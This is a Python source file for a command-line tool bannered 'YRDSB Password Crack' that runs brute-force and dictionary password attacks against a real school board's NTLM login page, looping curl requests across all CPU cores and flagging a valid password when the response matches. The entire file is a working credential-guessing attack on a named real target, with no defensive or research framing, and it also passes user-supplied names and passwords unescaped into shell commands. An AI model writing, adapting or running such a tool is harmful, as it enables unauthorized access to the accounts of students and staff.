import random
import subprocess
from multiprocessing import Queue, Process, cpu_count, Pool, Manager
import getopt
import sys
from colorama import Fore

dictionary_file = ""


def check_passwords1(username, passwords, result_queue):
    with Pool(cpu_count()) as pool:
        results = pool.starmap(is_valid_password1, [(username, password, result_queue) for password in passwords])
    for result in results:
        if result:
            print(Fore.RED + f"[!!!] Valid password found: {result}")
            break


def is_valid_password1(user, password, result_queue):
    result = subprocess.run(f'curl -k --ntlm -u "{user}:{password}" -o {user}.html '
                            f'"https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl="', shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[+] Testing for password: " + password)
    if "100   120  100   120    0     0" in result.stderr:
        print(Fore.WHITE + f"[!!!] Valid password found: {password}")
        result_queue.put(password)


def is_valid_password(user, password_queue, result_queue):
    while True:
        password = password_queue.get()
        if password is None:
            break
        url = f'https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl='
        command = f'curl -k --ntlm -u "{user}:{password}" -o {user}.html "{url}"'
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("[+] Testing for password: " + password)
        if "100   120  100   120    0     0" in result.stderr:
            print(Fore.WHITE + f"[!!!] Valid password found: {password}")
            result_queue.put(password)


def generate_passwords(num_passwords, password_queue):
    for i in range(int(float(num_passwords))):
        password_list = random.sample("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 7))
        password_list += random.choices("0123456789", k=8 - len(password_list))
        random.shuffle(password_list)
        password = ''.join(password_list)
        password_queue.put(password)


def check_passwords(username, num_passwords):
    result_queue = Queue()
    password_queue = Queue()
    generator_process = Process(target=generate_passwords, args=(num_passwords, password_queue))
    generator_process.start()
    test_processes = []
    for i in range(cpu_count()):
        test_process = Process(target=is_valid_password, args=(username, password_queue, result_queue))
        test_process.start()
        test_processes.append(test_process)

    for test_process in test_processes:
        test_process.join()
    generator_process.terminate()
    if not result_queue.empty():
        valid_password = result_queue.get()
        print(Fore.WHITE + f"[!!!] Valid password found: {valid_password}")
    else:
        exit(Fore.RED + f"[-] Password not found with {num_passwords} attempts :(")


def dic(username):
    global dictionary_file
    try:
        with open(dictionary_file, "r") as dictionary_file_file:
            passwords = [line.strip() for line in dictionary_file_file]
    except FileNotFoundError:
        print(Fore.RED + f"[-] No dictionary file by the name of '{dictionary_file}' was found")
        return

    with Manager() as manager:
        result_queue = manager.Queue()
        print(Fore.LIGHTGREEN_EX + f"[~] Dictionary list = {dictionary_file}")
        check_passwords1(username, passwords, result_queue=result_queue)


def brute(username, num_passwords):
    print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
    check_passwords(username, num_passwords)


def main():
    global dictionary_file
    while True:
        z = input(
            Fore.GREEN + "-----------------------\n[0] Exit\n[1] Brute-Force\n[2] Dictionary Attack\n-----------------------\n")
        if z == "0":
            exit()
        elif z == "1":
            username = input(Fore.GREEN + "[?] What is the username?:\n")
            num_passwords = int(input(Fore.GREEN + "[?] How many passwords to generate and test?:\n"))
            print(Fore.GREEN + "[~] Please be patient, passwords are generating and testing...")
            brute(username, num_passwords)
        elif z == "2":
            username = input(Fore.GREEN + "[?] What is the username?:\n")
            while True:
                dictionary_file = input(
                    Fore.GREEN + "[?] What is the dictionary file? (eg. C:\\Users\\User\\Downloads\\rockyou.txt):\n")
                try:
                    with open(dictionary_file, "r"):
                        print(Fore.GREEN + f"[~] {dictionary_file} is a valid file!")
                        break
                except:
                    print(Fore.RED + f"[-] {dictionary_file} is not a valid file.")
            print(Fore.LIGHTGREEN_EX + "[~] Dictionary attack starting...")
            dic(username)


if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], "hu:p:bn:",
                               ["simple", "help", "username", "passwords", "brute-force", "quiet", "numbers"])
    print(Fore.GREEN + """--------------------------------------------------------------------------------------------------------------
__   _____________  ___________  ______                                   _   _____                _    
\ \ / / ___ \  _  \/  ___| ___ \ | ___ \                                 | | /  __ \              | |   
 \ V /| |_/ / | | |\ `--.| |_/ / | |_/ /_ _ ___ _____      _____  _ __ __| | | /  \/_ __ __ _  ___| | __
  \ / |    /| | | | `--. \ ___ \ |  __/ _` / __/ __\ \ /\ / / _ \| '__/ _` | | |   | '__/ _` |/ __| |/ /
  | | | |\ \| |/ / /\__/ / |_/ / | | | (_| \__ \__ \ \ V  V / (_) | | | (_| | | \__/\ | | (_| | (__|   < 
  \_/ \_| \_|___/  \____/\____/  \_|  \__,_|___/___/ \_/\_/ \___/|_|  \__,_|  \____/_|  \__,_|\___|_|\_

--------------------------------------------------------------------------------------------------------------""")

    if any(opt in ('--username', '-u') for opt, _ in opts):
        try:
            username = opts[0][1]
        except:
            print(Fore.RED + "[-] Error: You did not provide a username after using the -u or --username operator.")
            exit()
        print(Fore.LIGHTGREEN_EX + f"[~] Username: {username}")
        if any(opt in ('--passwords', '-p') for opt, _ in opts):
            dictionary_file = opts[1][1]
            dic(username)
        elif any(opt in ('--brute-force', '-b') for opt, _ in opts):
            if any(opt in ('--numbers', '-n') for opt, _ in opts):
                num = opts[2][1]
                print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
                brute(username, num)
        else:
            print(
                Fore.RED + "[-] You need to have a password (--passwords or -p) list, or a brute-force (--brute-force or -b) attack option.")
            exit()

    elif any(opt in ('--help', '-h') for opt, _ in opts):
        print(Fore.GREEN + f"[~] Usage: python {sys.argv[0]} -u username -p password-list "
                           "\n--------------------------------------------------------------------------------------------------------------"
                           f"\n[~] Brute Force --> python {sys.argv[0]} -u username -b -n amount-of-passwords"
                           f"\n[~] Simple mode --> {sys.argv[0]} --simple"
                           "\n--------------------------------------------------------------------------------------------------------------" + Fore.LIGHTWHITE_EX)
    else:
        while True:
            jj = input(
                Fore.RED + f"[-] Provide an option to run this tool (-h after {sys.argv[0]} for help), do you want to run simple mode? (y/n):\n")
            if jj.lower() not in ["n", "y"]:
                print(Fore.RED + "[-] Please type in y for yes or n for no.")
            else:
                break
        if jj.lower() == "y":
            main()

    if any(opt in ('--simple') for opt, _ in opts):
        main()

